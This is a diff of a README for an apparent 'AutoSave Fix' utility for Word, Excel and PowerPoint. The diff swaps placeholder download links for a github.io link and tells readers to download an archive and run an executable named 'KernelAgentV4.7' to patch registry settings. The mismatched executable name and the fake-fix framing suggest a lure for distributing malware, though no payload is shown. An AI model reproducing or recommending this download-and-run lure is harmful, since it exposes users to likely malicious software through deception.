@@ -2,13 +2,15 @@
 
 Ensure uninterrupted AutoSave in Word, Excel, and PowerPoint with OneDrive and SharePoint integration. This utility patches registry settings, enables saving over cloud paths, and repairs disabled AutoSave toggles.
 
-[![Download AutoSave Fix](https://img.shields.io/badge/Download-AutoSave_Fix-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download AutoSave Fix](https://img.shields.io/badge/Download-AutoSave_Fix-blueviolet)](https://autosave-onedrive-sharepoint-m365-fix.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://autosave-onedrive-sharepoint-m365-fix.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g. `C:\M365AutoSaveFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to apply AutoSave configuration fixes  
 4. 💾 Open any synced Office document to verify AutoSave is working  
